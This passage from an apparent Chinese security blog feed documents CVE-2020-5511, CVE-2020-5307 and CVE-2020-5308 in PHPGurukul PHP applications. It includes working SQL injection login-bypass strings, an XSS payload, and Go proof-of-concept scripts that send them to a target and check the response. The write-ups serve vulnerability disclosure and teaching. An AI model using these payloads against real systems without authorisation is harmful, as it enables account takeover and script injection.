CRM数据库</p></li><li><p>导入crm.sql(given inside the zip package in SQL file folder)</p></li><li><p>访问 <a href="http://localhost/dfsms">http://localhost/dfsms</a></p></li></ol><p><img src="/img/CVE-2020-5511img/tables.png" alt="tables"></p><hr><h5 id="默认登录密码"><a href="#默认登录密码" class="headerlink" title="默认登录密码"></a>默认登录密码</h5><p><strong>Username:</strong> admin<br><strong>Password:</strong> Test@123</p><p><img src="/img/CVE-2020-5511img/index.png" alt="index"></p><p>能够登录成功说明数据库连接是没有问题的</p><hr><h4 id="CVE-2020-5511"><a href="#CVE-2020-5511" class="headerlink" title="CVE-2020-5511"></a>CVE-2020-5511</h4><h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><hr><p>漏洞名: PHPGurukul Small CRM SQL注入漏洞</p><p>类型：sql注入</p><p>危险级别：高危</p><p>来源：<a href="https://www.exploit-db.com/exploits/47874">https://www.exploit-db.com/exploits/47874</a></p><hr><p>页面访问</p><p>username：’=’’or  ‘1’ = ‘1’; – -</p><p>**Password：非空任意字符串</p><p><img src="/img/CVE-2020-5511img/index.png" alt="index"></p><hr><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>admin’ or</strong></p><p>admin后的引号破坏了之前的查询语句，闭合查询语句，注释了后面的内容，or ‘1’ = ‘1’保证了查询逻辑为真</p><p>登录逻辑</p><p><img src="/img/CVE-2020-5511img/loginlogic.png" alt="loginlogic"></p><p>原查询语句：SELECT * FROM user WHERE email=’”.$_POST[‘email’].”‘ and password=’”.$_POST[‘password’].”‘“</p><p>更改为</p><p>SELECT * FROM user WHERE email=’”‘=’’or  ‘1’ = ‘1’; – -“‘ and password=’”a”‘</p><p><img src="/img/CVE-2020-5511img/selectx.png" alt="selectx"></p><p>成功查询到5个用户，用户数量大于0即可绕过登录</p><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @Title  PHPGurukul Small CRM SQL注入漏洞</span></span><br><span class="line"><span class="comment">// @Description  PHPGurukul Small CRM SQL注入漏洞poc</span></span><br><span class="line"><span class="comment">// @Author  lennon</span></span><br><span class="line"><span class="comment">// @Update  2021-01-06</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">url := <span class="string">&quot;http://your-ip/crm/index.php&quot;</span></span><br><span class="line">method := <span class="string">&quot;POST&quot;</span></span><br><span class="line"></span><br><span class="line">payload := strings.NewReader(<span class="string">`email=%27%3D%27%27or++%271%27+%3D+%271%27%3B+--+-&amp;password=a&amp;login=`</span>)</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client &#123;</span><br><span class="line">&#125;</span><br><span class="line">req, err := http.NewRequest(method, url, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">req.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=b203fa4101b75860a7eccdacf076f177&quot;</span>)</span><br><span class="line"></span><br><span class="line">res, err := client.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(res.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> strings.Contains(<span class="keyword">string</span>(body),<span class="string">`window.location.href=&#x27;home.php&#x27;`</span>)&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;存在CVE-2020-5511漏洞&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;未检测到CVE-2020-5511漏洞&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>github:<a href="https://github.com/lennon-liu/vul_check/tree/main/2020/cve-2020-5511/1">–&gt;传送门&lt;–</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h4 id=&quot;产品介绍&quot;&gt;&lt;a href=&quot;#产品介绍&quot; class=&quot;headerlink&quot; title=&quot;产品介绍&quot;&gt;&lt;/a&gt;产品介绍&lt;/h4&gt;&lt;p&gt;PHPGurukul Small CRM是一套客户关系管理系统。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;系统详情&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="网络安全" scheme="https://lennon.work/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://lennon.work/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Dairy Farm Shop Management System Project (DFSMS) CVE-2020-5307 &amp; CVE-2020-5308</title>
    <link href="https://lennon.work/2021/04/11/cve/CVE-2020-5307&amp;8/"/>
    <id>https://lennon.work/2021/04/11/cve/CVE-2020-5307&amp;8/</id>
    <published>2021-04-11T14:58:54.383Z</published>
    <updated>2021-01-11T12:08:05.908Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Dairy-Farm-Shop-Management-System-Project-DFSMS"><a href="#Dairy-Farm-Shop-Management-System-Project-DFSMS" class="headerlink" title="Dairy Farm Shop Management System Project (DFSMS)"></a>Dairy Farm Shop Management System Project (DFSMS)</h3><hr><h4 id="产品介绍"><a href="#产品介绍" class="headerlink" title="产品介绍"></a>产品介绍</h4><p>Dairy Farm Shop Management System是一套基于PHP和MySQL的奶牛场管理系统。</p><hr><p>系统详情</p><p>Language Used          :** PHP</p><p><strong>Database                :</strong> MySQL</p><p><strong>User Interface Design    :</strong> HTML, AJAX,JQUERY,JAVASCRIPT</p><p><strong>Web Browser            :</strong> Mozilla, Google Chrome, IE8, OPERA</p><p><strong>Software                :</strong> XAMPP / Wamp / Mamp/ Lamp (anyone)</p><hr><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>​    系统下载：<a href="https://phpgurukul.com/?smd_process_download=1&amp;download_id=10924">https://phpgurukul.com/?smd_process_download=1&amp;download_id=10924</a></p><p>安装步骤：</p><ol><li><p>下载压缩包文件</p></li><li><p>解压文件拷贝dfsms文件夹</p></li><li><p>粘贴到根目录(for xampp xampp/htdocs, for wamp wamp/www, for lamp var/www/html)</p></li><li><p>打开phpmyadmin (<a href="http://localhost/phpmyadmin">http://localhost/phpmyadmin</a>)</p></li><li><p>创建 dfsms数据库</p></li><li><p>导入dfsms.sql(given inside the zip package in SQL file folder)</p></li><li><p>访问 <a href="http://localhost/dfsms">http://localhost/dfsms</a></p></li></ol><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/sqltable.png" alt="sqltable"></p><hr><h5 id="默认登录密码"><a href="#默认登录密码" class="headerlink" title="默认登录密码"></a>默认登录密码</h5><p><strong>Username:</strong> admin<br><strong>Password:</strong> Test@123</p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/login.png" alt="login"></p><p>能够登录成功说明数据库连接是没有问题的</p><hr><h4 id="CVE-2020-5307"><a href="#CVE-2020-5307" class="headerlink" title="CVE-2020-5307"></a>CVE-2020-5307</h4><h5 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><hr><p>漏洞名:Dairy Farm Shop Management System SQL注入漏洞</p><p>类型：sql注入</p><p>危险级别：超危</p><p>来源：<a href="https://www.exploit-db.com/exploits/47846">https://www.exploit-db.com/exploits/47846</a></p><hr><p>页面访问</p><p>username：<strong>admin’ or ‘1’ = ‘1’; – -</strong></p><p>**Password：非空任意字符串</p><p>成功绕过登录<img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/login_pass.png" alt="login_pass"></p><hr><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><strong>admin’ or</strong></p><p>admin后的引号破坏了之前的查询语句，闭合查询语句，注释了后面的内容，or ‘1’ = ‘1’保证了查询逻辑为真</p><p>登录逻辑</p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/mysqlquery.png" alt="mysqlquery"></p><p>原查询语句：select ID from tbladmin where  UserName=’$adminuser’ &amp;&amp; Password=’$password’</p><p>更改为</p><p>select ID from tbladmin where  UserName=’<strong>admin’ or ‘1’ = ‘1’; – -</strong>‘ &amp;&amp; Password=’a’</p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/sqlcontent.png" alt="sqlcontent"></p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/query_result.png" alt="query_result"></p><p>成功查询到admin账户的id。</p><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @Title  Dairy Farm Shop Management System SQL注入漏洞</span></span><br><span class="line"><span class="comment">// @Description  golang实现Dairy Farm Shop Management System SQL注入漏洞登录绕过</span></span><br><span class="line"><span class="comment">// @Author  lennon</span></span><br><span class="line"><span class="comment">// @Update  2021-01-06</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">   <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   url := <span class="string">&quot;http://your-ip/dfsms/index.php&quot;</span></span><br><span class="line">   method := <span class="string">&quot;POST&quot;</span></span><br><span class="line">   payload := strings.NewReader(<span class="string">`username=admin%27+or+%271%27+%3D+%271%27%3B+--+-&amp;password=a&amp;login=`</span>)</span><br><span class="line">   client := &amp;http.Client&#123;&#125;</span><br><span class="line">   req, err := http.NewRequest(method, url, payload)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">   req.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=ogvk4oricas9oudnb7hb88kgjg&quot;</span>)</span><br><span class="line">   res, err := client.Do(req)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">   body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//fmt.Println(string(body))</span></span><br><span class="line">   <span class="keyword">if</span> strings.Contains(<span class="keyword">string</span>(body), <span class="string">&quot;Add Product&quot;</span>) &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;存在CVE-2020-5307漏洞&quot;</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;未检测到CVE-2020-5307漏洞&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>github:<a href="https://github.com/lennon-liu/vul_check/tree/main/2020/cve-2020-5307/1">–&gt;传送门&lt;–</a></p><hr><h4 id="CVE-2020-5308"><a href="#CVE-2020-5308" class="headerlink" title="CVE-2020-5308"></a>CVE-2020-5308</h4><hr><h5 id="漏洞详情-1"><a href="#漏洞详情-1" class="headerlink" title="漏洞详情"></a>漏洞详情</h5><p>漏洞名:PHPGurukul Dairy Farm Shop Management System 跨站脚本漏洞</p><p>类型：跨站脚本</p><p>危险级别：中危</p><p>来源：<a href="https://cinzinga.github.io/CVE-2020-5307-5308/">https://cinzinga.github.io/CVE-2020-5307-5308/</a></p><hr><p>访问<a href="http://your-ip/dfsms/add-category.php">http://your-ip/dfsms/add-category.php</a></p><p>测试：       category：<code>&lt;script&gt;alert(&quot;category&quot;)&lt;/script&gt;</code></p><p>​                    code：<code>&lt;script&gt;alert(&quot;code&quot;)&lt;/script&gt;</code></p><p>提交</p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/add_category.png" alt="add_category"></p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/image-20210106174618988.png" alt="image-20210106174618988"></p><p>提示添加成功</p><p>访问<a href="http://your-ip/dfsms/add-category.php">http://your-ip/dfsms/add-category.php</a></p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/alert1.png" alt="alert2"></p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/alert2.png" alt="alert2"></p><p>可以看到xss测试已经生效</p><hr><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/add_category_code.png" alt="add_category_code"></p><p>写入数据库时未对CategoryName和CategoryCode做处理直接写入数据库</p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/category_data.png" alt="category_data"></p><p>显示未作任何处理</p><p><img src="img/CVE-2020-5307&8/CVE-2020-5307&8img/category_show.png" alt="category_show"></p><hr><h5 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @Title  Dairy Farm Shop Management System SQL注入漏洞</span></span><br><span class="line"><span class="comment">// @Description  golang实现Dairy Farm Shop Management System SQL注入漏洞登录绕过</span></span><br><span class="line"><span class="comment">// @Author  lennon</span></span><br><span class="line"><span class="comment">// @Update  2021-01-06</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">   <span class="string">&quot;net/http&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">   url := <span class="string">&quot;http://your-ip/dfsms/add-category.php&quot;</span></span><br><span class="line">   method := <span class="string">&quot;POST&quot;</span></span><br><span class="line"></span><br><span class="line">   payload := strings.NewReader(<span class="string">`category=%3Cscript%3Ealert%28%22thisisxssvulntest%22%29%3C%2Fscript%3E&amp;categorycode=test&amp;submit=`</span>)</span><br><span class="line"></span><br><span class="line">   client := &amp;http.Client &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   req, err := http.NewRequest(method, url, payload)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   req.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=ogvk4oricas9oudnb7hb88kgjg&quot;</span>)</span><br><span class="line">   req.Header.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line"></span><br><span class="line">   res, err := client.Do(req)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">   body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> !strings.Contains(<span class="keyword">string</span>(body), <span class="string">`Category added successfully.`</span>) &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;未检测到CVE-2020-5308漏洞&quot;</span>)</span><br><span class="line">      os.Exit(<span class="number">0</span>)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   url2 := <span class="string">&quot;http://your-ip/dfsms/manage-categories.php&quot;</span></span><br><span class="line">   method2 := <span class="string">&quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   client2 := &amp;http.Client &#123;</span><br><span class="line">   &#125;</span><br><span class="line">   req2, err := http.NewRequest(method2, url2, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   req2.Header.Add(<span class="string">&quot;Cookie&quot;</span>, <span class="string">&quot;PHPSESSID=ogvk4oricas9oudnb7hb88kgjg&quot;</span>)</span><br><span class="line"></span><br><span class="line">   res2, err := client2.Do(req2)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res2.Body.Close()</span><br><span class="line"></span><br><span class="line">   body2, err := ioutil.ReadAll(res2.Body)</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Println(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> strings.Contains(<span class="keyword">string</span>(body2), <span class="string">`&lt;script&gt;alert(&quot;thisisxssvulntest&quot;)&lt;/script&gt;`</span>) &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;存在CVE-2020-5308漏洞&quot;</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      fmt.Println(<span class="string">&quot;未检测到CVE-2020-5308漏洞&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>github:<a href="https://github.com/lennon-liu/vul_check/tree/main/2020/cve-2020-5308/1">–&gt;传送门&lt;–</a></p><hr><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://cinzinga.com/CVE-2020-5307-5308/">https://cinzinga.com/CVE-2020-5307-5308/</a></p><p><a href="https://www.exploit-db.com/exploits/47846">https://www.exploit-db.com/exploits/47846</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Dairy-Farm-Shop-Management-System-Project-DFSMS&quot;&gt;&lt;a href=&quot;#Dairy-Farm-Shop-Management-System-Project-DFSMS&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="网络安全" scheme="https://lennon.work/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="渗透测试" scheme="https://lennon.work/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
